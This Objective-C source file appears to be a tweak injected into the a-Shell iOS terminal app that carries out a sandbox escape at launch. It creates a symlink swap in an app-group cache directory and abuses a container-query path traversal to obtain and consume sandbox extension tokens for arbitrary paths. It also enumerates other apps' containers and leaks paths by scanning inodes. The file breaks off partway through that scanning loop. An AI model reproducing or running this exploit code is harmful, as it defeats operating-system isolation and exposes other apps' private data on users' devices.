//
//  TerminalSBX.m
//  Terminal (a-Shell 2.3.2 full + worse_query)
//
//  In-process commands and launch-time sandbox escape for a-Shell.
//  Primary primitive: worse_query (forcequitOS), GPL-3.0.
//  Fallback primitive: class-13 part-domain traversal (Veilpath / bad_query lineage).
//
//  This file is loaded by the a-Shell binary at launch (weak LC_LOAD_DYLIB) and
//  through commandDictionary.plist.  It is not a standalone application.
//

#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Security/Security.h>
#import <UIKit/UIKit.h>
#import <Metal/Metal.h>

#include <dlfcn.h>
#include <dirent.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fsgetpath.h>
#include <sys/mount.h>
#include <sys/sysctl.h>
#include <sys/utsname.h>
#include <mach/mach.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <time.h>
#include <unistd.h>
#include <xpc/xpc.h>

// ---------------------------------------------------------------------------
// Output streams
// ---------------------------------------------------------------------------

static FILE *sbx_out(void) {
    typedef FILE *(*ios_stream_fn)(void);
    static ios_stream_fn out_fn = NULL;
    static int tried = 0;
    if (!tried) {
        out_fn = (ios_stream_fn)dlsym(RTLD_DEFAULT, "ios_stdout");
        tried = 1;
    }
    if (out_fn) {
        FILE *f = out_fn();
        if (f) return f;
    }
    FILE **tls = (FILE **)dlsym(RTLD_DEFAULT, "thread_stdout");
    if (tls && *tls) return *tls;
    return stdout;
}

static FILE *sbx_err(void) {
    typedef FILE *(*ios_stream_fn)(void);
    static ios_stream_fn err_fn = NULL;
    static int tried = 0;
    if (!tried) {
        err_fn = (ios_stream_fn)dlsym(RTLD_DEFAULT, "ios_stderr");
        tried = 1;
    }
    if (err_fn) {
        FILE *f = err_fn();
        if (f) return f;
    }
    FILE **tls = (FILE **)dlsym(RTLD_DEFAULT, "thread_stderr");
    if (tls && *tls) return *tls;
    return stderr;
}

static void sbx_printf(const char *fmt, ...) {
    FILE *f = sbx_out();
    va_list ap;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
    fflush(f);
}

static void sbx_eprintf(const char *fmt, ...) {
    FILE *f = sbx_err();
    va_list ap;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
    fflush(f);
}

// ---------------------------------------------------------------------------
// Launch progress UI
// ---------------------------------------------------------------------------

@interface SBXProgressViewController : UIViewController
@property (nonatomic, strong) UIProgressView *progressView;
@property (nonatomic, strong) UILabel *titleLabel;
@property (nonatomic, strong) UILabel *statusLabel;
@property (nonatomic, strong) UILabel *percentLabel;
- (void)updateProgress:(double)value status:(NSString *)status;
@end

@implementation SBXProgressViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.82];
    self.view.accessibilityViewIsModal = YES;

    UIView *card = [[UIView alloc] initWithFrame:CGRectZero];
    card.translatesAutoresizingMaskIntoConstraints = NO;
    card.backgroundColor = [UIColor colorWithWhite:0.12 alpha:0.98];
    card.layer.cornerRadius = 18.0;
    card.layer.masksToBounds = YES;
    [self.view addSubview:card];

    self.titleLabel = [[UILabel alloc] initWithFrame:CGRectZero];
    self.titleLabel.text = @"Terminal";
    self.titleLabel.font = [UIFont systemFontOfSize:24 weight:UIFontWeightSemibold];
    self.titleLabel.textColor = [UIColor whiteColor];
    self.titleLabel.textAlignment = NSTextAlignmentCenter;

    self.statusLabel = [[UILabel alloc] initWithFrame:CGRectZero];
    self.statusLabel.text = @"正在获取沙盒扩展…";
    self.statusLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightRegular];
    self.statusLabel.textColor = [UIColor colorWithWhite:0.88 alpha:1.0];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.numberOfLines = 0;

    self.progressView = [[UIProgressView alloc] initWithProgressViewStyle:UIProgressViewStyleDefault];
    self.progressView.translatesAutoresizingMaskIntoConstraints = NO;
    self.progressView.progressTintColor = [UIColor systemGreenColor];
    self.progressView.trackTintColor = [UIColor colorWithWhite:0.30 alpha:1.0];
    self.progressView.progress = 0.0;
    self.progressView.transform = CGAffineTransformMakeScale(1.0, 2.0);
    self.progressView.layer.cornerRadius = 2.0;
    self.progressView.clipsToBounds = YES;

    self.percentLabel = [[UILabel alloc] initWithFrame:CGRectZero];
    self.percentLabel.text = @"0%";
    self.percentLabel.font = [UIFont monospacedDigitSystemFontOfSize:14 weight:UIFontWeightMedium];
    self.percentLabel.textColor = [UIColor colorWithWhite:0.75 alpha:1.0];
    self.percentLabel.textAlignment = NSTextAlignmentCenter;

    UIStackView *stack = [[UIStackView alloc] initWithArrangedSubviews:@[
        self.titleLabel, self.statusLabel, self.progressView, self.percentLabel
    ]];
    stack.translatesAutoresizingMaskIntoConstraints = NO;
    stack.axis = UILayoutConstraintAxisVertical;
    stack.alignment = UIStackViewAlignmentFill;
    stack.spacing = 14.0;
    [card addSubview:stack];

    NSLayoutConstraint *width = [card.widthAnchor constraintEqualToAnchor:self.view.widthAnchor multiplier:0.86];
    width.priority = UILayoutPriorityDefaultHigh;
    [NSLayoutConstraint activateConstraints:@[
        [card.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [card.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor],
        width,
        [card.widthAnchor constraintLessThanOrEqualToConstant:420.0],
        [stack.topAnchor constraintEqualToAnchor:card.topAnchor constant:28.0],
        [stack.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:24.0],
        [stack.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-24.0],
        [stack.bottomAnchor constraintEqualToAnchor:card.bottomAnchor constant:-28.0],
        [self.progressView.heightAnchor constraintEqualToConstant:8.0],
    ]];
}

- (void)updateProgress:(double)value status:(NSString *)status {
    if (value < 0.0) value = 0.0;
    if (value > 1.0) value = 1.0;
    [self.progressView setProgress:(float)value animated:YES];
    self.percentLabel.text = [NSString stringWithFormat:@"%d%%", (int)(value * 100.0 + 0.5)];
    if (status.length > 0) self.statusLabel.text = status;
}

@end

static SBXProgressViewController *g_progressVC = nil;
static BOOL g_progressPresenting = NO;
static BOOL g_progressFinished = NO;
static BOOL g_progressEnabled = NO;
static double g_progressValue = 0.0;
static NSString *g_progressStatus = @"正在获取沙盒扩展…";
static pthread_mutex_t g_progressLock = PTHREAD_MUTEX_INITIALIZER;

static void sbx_open_sandbox_list(void);

static UIWindow *sbx_key_window(void) {
    UIApplication *app = [UIApplication sharedApplication];
    for (UIScene *scene in app.connectedScenes) {
        if (![scene isKindOfClass:[UIWindowScene class]]) continue;
        UIWindowScene *windowScene = (UIWindowScene *)scene;
        for (UIWindow *window in windowScene.windows) {
            if (window.isKeyWindow && !window.hidden) return window;
        }
    }
    for (UIScene *scene in app.connectedScenes) {
        if (![scene isKindOfClass:[UIWindowScene class]]) continue;
        UIWindowScene *windowScene = (UIWindowScene *)scene;
        for (UIWindow *window in windowScene.windows) {
            if (!window.hidden) return window;
        }
    }
    return nil;
}

static void sbx_present_progress_now(void) {
    if (g_progressVC != nil || g_progressPresenting || g_progressFinished) return;
    UIWindow *window = sbx_key_window();
    if (window == nil || window.rootViewController == nil) return;

    UIViewController *root = window.rootViewController;
    while (root.presentedViewController != nil) root = root.presentedViewController;

    pthread_mutex_lock(&g_progressLock);
    double value = g_progressValue;
    NSString *status = g_progressStatus;
    pthread_mutex_unlock(&g_progressLock);

    [window endEditing:YES];

    g_progressPresenting = YES;
    SBXProgressViewController *vc = [[SBXProgressViewController alloc] initWithNibName:nil bundle:nil];
    vc.modalPresentationStyle = UIModalPresentationOverFullScreen;
    vc.modalTransitionStyle = UIModalTransitionStyleCrossDissolve;
    if (@available(iOS 13.0, *)) vc.modalInPresentation = YES;
    [vc updateProgress:value status:status];
    [root presentViewController:vc animated:NO completion:^{
        g_progressPresenting = NO;
        if (g_progressFinished) {
            [vc dismissViewControllerAnimated:NO completion:nil];
            return;
        }
        g_progressVC = vc;
        pthread_mutex_lock(&g_progressLock);
        double current = g_progressValue;
        NSString *currentStatus = g_progressStatus;
        pthread_mutex_unlock(&g_progressLock);
        [vc updateProgress:current status:currentStatus];
    }];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (g_progressVC == nil) g_progressPresenting = NO;
    });
}

static void sbx_present_progress_retry(int attempts) {
    if (g_progressVC != nil || g_progressFinished || attempts <= 0) return;
    sbx_present_progress_now();
    if (g_progressVC == nil) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.25 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            sbx_present_progress_retry(attempts - 1);
        });
    }
}

static void sbx_show_progress(void) {
    pthread_mutex_lock(&g_progressLock);
    g_progressEnabled = YES;
    g_progressFinished = NO;
    g_progressValue = 0.01;
    g_progressStatus = @"正在初始化沙盒环境…";
    pthread_mutex_unlock(&g_progressLock);

    dispatch_async(dispatch_get_main_queue(), ^{
        sbx_present_progress_retry(80);
    });
}

static void sbx_progress_set(double value, NSString *status) {
    pthread_mutex_lock(&g_progressLock);
    if (!g_progressEnabled) {
        pthread_mutex_unlock(&g_progressLock);
        return;
    }
    g_progressValue = value;
    if (status.length > 0) g_progressStatus = [status copy];
    pthread_mutex_unlock(&g_progressLock);

    dispatch_async(dispatch_get_main_queue(), ^{
        if (g_progressVC != nil) [g_progressVC updateProgress:value status:status];
    });
}

static void sbx_progress_finish(void) {
    pthread_mutex_lock(&g_progressLock);
    if (!g_progressEnabled) {
        pthread_mutex_unlock(&g_progressLock);
        return;
    }
    g_progressFinished = YES;
    g_progressValue = 1.0;
    g_progressStatus = @"完成，正在进入 _sandbox…";
    pthread_mutex_unlock(&g_progressLock);

    dispatch_async(dispatch_get_main_queue(), ^{
        SBXProgressViewController *vc = g_progressVC;
        if (vc == nil) {
            sbx_open_sandbox_list();
            return;
        }
        [vc updateProgress:1.0 status:@"完成，正在进入 _sandbox…"];
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.45 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            if (g_progressVC == nil) {
                sbx_open_sandbox_list();
                return;
            }
            SBXProgressViewController *current = g_progressVC;
            g_progressVC = nil;
            [current dismissViewControllerAnimated:YES completion:^{
                sbx_open_sandbox_list();
            }];
        });
    });
}

static void sbx_open_command_url(NSString *command) {
    if (command.length == 0) return;
    NSCharacterSet *allowed = [NSCharacterSet characterSetWithCharactersInString:
                               @"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~"];
    NSString *encoded = [command stringByAddingPercentEncodingWithAllowedCharacters:allowed];
    NSURL *url = [NSURL URLWithString:[@"ashell:" stringByAppendingString:encoded ?: @""]];
    if (url == nil) return;
    NSLog(@"[TerminalSBX] opening command URL: %@", url.absoluteString);
    [[UIApplication sharedApplication] openURL:url options:@{} completionHandler:^(BOOL success) {
        if (!success) NSLog(@"[TerminalSBX] could not open command URL: %@", command);
    }];
}

static void sbx_open_sandbox_list(void) {
    // Run both commands through "source" in one URL.  This keeps the cwd
    // change in the current shell session, and avoids relying on semicolon
    // or "&&" parsing in a-Shell's URL command path.
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSString *scriptPath = [docs stringByAppendingPathComponent:@".sbx_start"];
    NSString *script = @"clear\ncd ~/Documents/_sandbox\nls\n";
    [script writeToFile:scriptPath atomically:YES encoding:NSUTF8StringEncoding error:NULL];
    sbx_open_command_url(@"source ~/Documents/.sbx_start");
}

// ---------------------------------------------------------------------------
// Global state
// ---------------------------------------------------------------------------

static pthread_mutex_t g_lock = PTHREAD_MUTEX_INITIALIZER;        // handles / group / state
static pthread_mutex_t g_query_lock = PTHREAD_MUTEX_INITIALIZER;  // one containermanager query at a time
static pthread_mutex_t g_mount_lock = PTHREAD_MUTEX_INITIALIZER;  // serialise automount

static NSMutableArray<NSDictionary *> *g_handles = nil;
static NSMutableSet<NSString *> *g_accessible_roots = nil;
static NSString *g_group = nil;
static BOOL g_mount_done = NO;
static BOOL g_mount_running = NO;
static int64_t g_mount_mounted = 0;
static int64_t g_mount_failed = 0;

static void sbx_mark_root(NSString *root) {
    pthread_mutex_lock(&g_lock);
    if (g_accessible_roots == nil) g_accessible_roots = [NSMutableSet set];
    [g_accessible_roots addObject:root];
    pthread_mutex_unlock(&g_lock);
}

static BOOL sbx_root_accessible(NSString *root) {
    pthread_mutex_lock(&g_lock);
    BOOL value = [g_accessible_roots containsObject:root];
    pthread_mutex_unlock(&g_lock);
    return value;
}

// ---------------------------------------------------------------------------
// Path helpers
// ---------------------------------------------------------------------------

static NSString *sbx_canonical(NSString *raw) {
    if (raw == nil) return @"";
    NSString *path = [raw stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
    if (path.length == 0) return @"";
    if ([path hasPrefix:@"file://"]) {
        NSURL *url = [NSURL URLWithString:path];
        if (url.path.length > 0) path = url.path;
    }
    if (![path hasPrefix:@"/"]) {
        NSString *cwd = [[NSFileManager defaultManager] currentDirectoryPath];
        if (cwd.length == 0) cwd = NSHomeDirectory();
        path = [cwd stringByAppendingPathComponent:path];
    }
    path = [path stringByStandardizingPath];
    if ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"]) {
        path = [@"/private" stringByAppendingString:path];
    }
    while ([path hasPrefix:@"/private/private/"]) {
        path = [@"/private" stringByAppendingString:[path substringFromIndex:@"/private".length]];
    }
    return path;
}

static NSString *sbx_display(NSString *raw) {
    NSString *path = sbx_canonical(raw);
    if ([path isEqualToString:@"/private/var"]) return @"/var";
    if ([path hasPrefix:@"/private/var/"]) {
        return [@"/var" stringByAppendingString:[path substringFromIndex:@"/private/var".length]];
    }
    return path;
}

static BOOL sbx_is_own_path(NSString *path) {
    NSString *home = sbx_canonical(NSHomeDirectory());
    if (path.length == 0 || home.length == 0) return NO;
    if ([path isEqualToString:home]) return YES;
    return [path hasPrefix:[home stringByAppendingString:@"/"]];
}

static NSString *sbx_mount_root(void) {
    return [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/_sandbox"];
}

static BOOL sbx_path_exists(NSString *path) {
    struct stat st;
    return lstat(path.fileSystemRepresentation, &st) == 0;
}

static BOOL sbx_path_is_dir(NSString *path) {
    struct stat st;
    if (lstat(path.fileSystemRepresentation, &st) != 0) return NO;
    return S_ISDIR(st.st_mode) != 0;
}

// ---------------------------------------------------------------------------
// App Group resolution
// ---------------------------------------------------------------------------

static NSArray<NSString *> *sbx_groups_from_profile(void) {
    NSString *profile = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"embedded.mobileprovision"];
    NSData *data = [NSData dataWithContentsOfFile:profile];
    if (data.length == 0) return @[];

    NSData *startTag = [@"<?xml" dataUsingEncoding:NSUTF8StringEncoding];
    NSData *endTag = [@"</plist>" dataUsingEncoding:NSUTF8StringEncoding];
    NSRange start = [data rangeOfData:startTag options:0 range:NSMakeRange(0, data.length)];
    if (start.location == NSNotFound) return @[];
    NSRange end = [data rangeOfData:endTag options:0
                              range:NSMakeRange(start.location, data.length - start.location)];
    if (end.location == NSNotFound) return @[];
    NSRange full = NSMakeRange(start.location, NSMaxRange(end) - start.location);
    NSData *plistData = [data subdataWithRange:full];

    id plist = [NSPropertyListSerialization propertyListWithData:plistData
                                                         options:NSPropertyListImmutable
                                                          format:NULL
                                                           error:NULL];
    if (![plist isKindOfClass:[NSDictionary class]]) return @[];
    id ent = ((NSDictionary *)plist)[@"Entitlements"];
    if (![ent isKindOfClass:[NSDictionary class]]) return @[];
    id groups = ((NSDictionary *)ent)[@"com.apple.security.application-groups"];
    if (![groups isKindOfClass:[NSArray class]]) return @[];
    NSMutableArray *out = [NSMutableArray array];
    for (id g in (NSArray *)groups) {
        if ([g isKindOfClass:[NSString class]]) [out addObject:g];
    }
    return out;
}

static NSArray<NSString *> *sbx_groups_from_entitlements(void) {
    void *sec = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_LAZY);
    if (!sec) return @[];

    typedef void *(*task_create_fn)(CFAllocatorRef);
    typedef CFTypeRef (*task_copy_fn)(void *, CFStringRef, CFErrorRef *);
    task_create_fn create = (task_create_fn)dlsym(sec, "SecTaskCreateFromSelf");
    task_copy_fn copy = (task_copy_fn)dlsym(sec, "SecTaskCopyValueForEntitlement");
    if (!create || !copy) return @[];

    void *task = create(NULL);
    if (!task) return @[];
    CFTypeRef value = copy(task, CFSTR("com.apple.security.application-groups"), NULL);
    NSMutableArray *out = [NSMutableArray array];
    if (value) {
        if (CFGetTypeID(value) == CFArrayGetTypeID()) {
            NSArray *arr = (__bridge NSArray *)value;
            for (id g in arr) {
                if ([g isKindOfClass:[NSString class]]) [out addObject:g];
            }
        }
        CFRelease(value);
    }
    CFRelease(task);
    return out;
}

static void sbx_resolve_group(void) {
    pthread_mutex_lock(&g_lock);
    if (g_group != nil) {
        pthread_mutex_unlock(&g_lock);
        return;
    }
    pthread_mutex_unlock(&g_lock);

    NSMutableArray<NSString *> *candidates = [NSMutableArray array];
    void (^add)(id) = ^(id value) {
        if ([value isKindOfClass:[NSString class]] && [(NSString *)value length] > 0 &&
            ![candidates containsObject:value]) {
            [candidates addObject:value];
        }
    };

    add([[NSBundle mainBundle] objectForInfoDictionaryKey:@"AppGroupIdentifier"]);
    for (NSString *g in sbx_groups_from_entitlements()) add(g);
    for (NSString *g in sbx_groups_from_profile()) add(g);

    // Groups provisioned for the signing identity used by this workspace.
    add(@"group.com.cert.account.t260930000125.01");
    add(@"group.com.cert.account.t260930000125.02");
    add(@"group.com.cert.account.t260930000125.03");
    add(@"group.com.cert.account.t260930000125.04");
    add(@"group.com.cert.account.t260930000125.05");
    add(@"group.AsheKube.a-Shell");

    NSFileManager *fm = [NSFileManager defaultManager];
    // The group container is sometimes not visible during the first few
    // hundred milliseconds of app launch.  Retry briefly so commands issued
    // immediately by a URL or .profile do not race the sandbox setup.
    for (int attempt = 0; attempt < 15; attempt++) {
        for (NSString *group in candidates) {
            NSURL *url = [fm containerURLForSecurityApplicationGroupIdentifier:group];
            if (!url) continue;
            NSURL *library = [url URLByAppendingPathComponent:@"Library" isDirectory:YES];
            [fm createDirectoryAtURL:library withIntermediateDirectories:YES attributes:nil error:NULL];
            pthread_mutex_lock(&g_lock);
            g_group = [group copy];
            pthread_mutex_unlock(&g_lock);
            NSLog(@"[TerminalSBX] app group: %@ at %@", group, url.path);
            return;
        }
        usleep(100000);
    }

    NSLog(@"[TerminalSBX] no accessible app group; falling back to class-13 primitive");
}

static NSString *sbx_group(void) {
    pthread_mutex_lock(&g_lock);
    NSString *group = g_group;
    pthread_mutex_unlock(&g_lock);
    if (group == nil) {
        sbx_resolve_group();
        pthread_mutex_lock(&g_lock);
        group = g_group;
        pthread_mutex_unlock(&g_lock);
    }
    return group;
}

// ---------------------------------------------------------------------------
// worse_query (forcequitOS, GPL-3.0)
// ---------------------------------------------------------------------------

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_iterate_results_sync_fn)(void *, void (^)(void *));
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef const char *(*container_object_get_path_fn)(void *);
typedef const char *(*container_object_get_identifier_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

static void sbx_clean_group_caches(NSString *group) {
    if (group.length == 0) return;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!root) return;
    NSURL *caches = [root URLByAppendingPathComponent:@"Library/Caches" isDirectory:YES];
    [fm removeItemAtURL:caches error:NULL];
    [fm createDirectoryAtURL:caches withIntermediateDirectories:NO attributes:nil error:NULL];
}

static int64_t sbx_worse_query(NSString *target, bool alt_flags, bool create_dir) {
    if (target.length == 0 || ![target hasPrefix:@"/"]) return -255;
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;
    }

    NSString *group = sbx_group();
    if (group.length == 0) return -1;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupRoot) return -1;
    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers =
        (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags =
        (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part =
        (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result =
        (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token =
        (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension =
        (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags ||
        !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token ||
        !consume_extension) {
        dlclose(mgr);
        return -2;
    }

    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -3;
    }

    xpc_object_t identifier = xpc_string_create(group.UTF8String);
    query_set_class(query, 7); // app group
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3); // Library/Caches

    if (alt_flags) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }

    [fm removeItemAtPath:caches error:NULL];
    if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:NULL]) {
        query_free(query);
        dlclose(mgr);
        return -4;
    }

    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        dlclose(mgr);
        sbx_clean_group_caches(group);
        return -5;
    }

    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        dlclose(mgr);
        sbx_clean_group_caches(group);
        return -6;
    }

    int64_t handle = consume_extension(token);
    free(token);
    query_free(query);
    dlclose(mgr);
    sbx_clean_group_caches(group);
    return handle;
}

static void sbx_release_handle(int64_t handle) {
    if (handle <= 0) return;
    sandbox_extension_release_fn release_extension =
        (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}

// ---------------------------------------------------------------------------
// Class-13 fallback (Veilpath / bad_query lineage)
// ---------------------------------------------------------------------------

static int64_t sbx_fallback_query(NSString *target, bool alt_flags) {
    if (target.length == 0 || ![target hasPrefix:@"/"]) return -255;
    struct stat st;
    if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers =
        (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags =
        (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part =
        (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain =
        (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result =
        (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token =
        (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension =
        (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags ||
        !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free ||
        !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -1;
    }

    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -3;
    }

    xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    query_set_class(query, 13);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);

    char *part = NULL;
    if (asprintf(&part, "../../../../../../../..%s", target.fileSystemRepresentation) == -1) {
        query_free(query);
        dlclose(mgr);
        return -5;
    }
    query_set_part_domain(query, part);
    if (alt_flags) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }

    void *result = query_get_single_result(query);
    if (!result) {
        free(part);
        query_free(query);
        dlclose(mgr);
        return -5;
    }

    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part);
        query_free(query);
        dlclose(mgr);
        return -6;
    }

    int64_t handle = consume_extension(token);
    free(token);
    free(part);
    query_free(query);
    dlclose(mgr);
    return handle;
}

// ---------------------------------------------------------------------------
// Container enumeration (needed for the Application / daemon / plugin roots,
// whose parent directory cannot itself be granted on iOS 27)
// ---------------------------------------------------------------------------

static NSArray<NSDictionary *> *sbx_enumerate_class(uint64_t container_class) {
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return nil;

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_iterate_results_sync_fn iterate =
        (container_query_iterate_results_sync_fn)dlsym(mgr, "container_query_iterate_results_sync");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_object_get_path_fn get_path =
        (container_object_get_path_fn)dlsym(mgr, "container_object_get_path");
    container_object_get_identifier_fn get_identifier =
        (container_object_get_identifier_fn)dlsym(mgr, "container_object_get_identifier");
    if (!get_identifier) get_identifier = (container_object_get_identifier_fn)dlsym(mgr, "container_result_get_identifier");

    if (!query_create || !query_set_class || !iterate || !query_free || !get_path) {
        dlclose(mgr);
        return nil;
    }

    void *query = query_create();
    if (!query) { dlclose(mgr); return nil; }
    query_set_class(query, container_class);

    NSMutableArray<NSDictionary *> *out = [NSMutableArray array];
    __block container_object_get_path_fn blk_get_path = get_path;
    __block container_object_get_identifier_fn blk_get_id = get_identifier;

    iterate(query, ^(void *result) {
        if (!result || !blk_get_path) return;
        const char *path = blk_get_path(result);
        const char *identifier = blk_get_id ? blk_get_id(result) : NULL;
        if (!path || path[0] == '\0') return;
        NSString *p = [NSString stringWithUTF8String:path];
        if (p.length == 0) return;
        p = sbx_canonical(p);
        NSString *i = (identifier && identifier[0]) ? [NSString stringWithUTF8String:identifier] : nil;
        [out addObject:@{@"path": p, @"id": i ?: @""}];
    });

    query_free(query);
    dlclose(mgr);
    return out;
}

// ---------------------------------------------------------------------------
// Inode path enumeration (pathleak)
//
// fsgetpath() resolves a file-system object id to its absolute path without
// requiring directory-search permission.  Scanning the inode range and
// keeping immediate children of a root enumerates containers when a
// containermanager query for the parent is refused.  Derived from pathleak
// (forcequitOS, GPL-3.0).
// ---------------------------------------------------------------------------

static double sbx_now(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (double)ts.tv_sec + (double)ts.tv_nsec / 1000000000.0;
}

static NSArray<NSString *> *sbx_pathleak(NSString *root, uint64_t max_inode, double seconds) {
    if (root.length == 0 || max_inode < 1) return nil;
    NSString *dir = sbx_canonical(root);
    while (dir.length > 1 && [dir hasSuffix:@"/"]) dir = [dir substringToIndex:dir.length - 1];

    struct statfs sfs;
    if (statfs(dir.fileSystemRepresentation, &sfs) != 0) {
        NSString *tmp = NSTemporaryDirectory();
        if (tmp.length == 0 || statfs(tmp.fileSystemRepresentation, &sfs) != 0) return nil;
    }
    fsid_t fsid = sfs.f_fsid;

    const char *prefix = dir.fileSystemRepresentation;
    size_t prefix_len = strlen(prefix);
    NSMutableArray<NSString *> *result = [NSMutableArray array];
    char buffer[PATH_MAX];
    double start = sbx_now();

    for (uint64_t inode = 1; inode <= max_inode; inode++) {
        if (seconds > 0 && (inode & 0xFFF) == 0 && (sbx_now() - start) > seconds) break;
        ssize_t n = fsgetpath(buffer, sizeof(buffer), &fsid, inode);
        if (n <= 0) continue;
        if (strncmp(buffer, prefix, prefix_len) != 0) continue;
        if (buffer[prefix_len] != '/') continue;
        if (strchr(buffer + prefix_len + 1, '/') != NULL) continue;
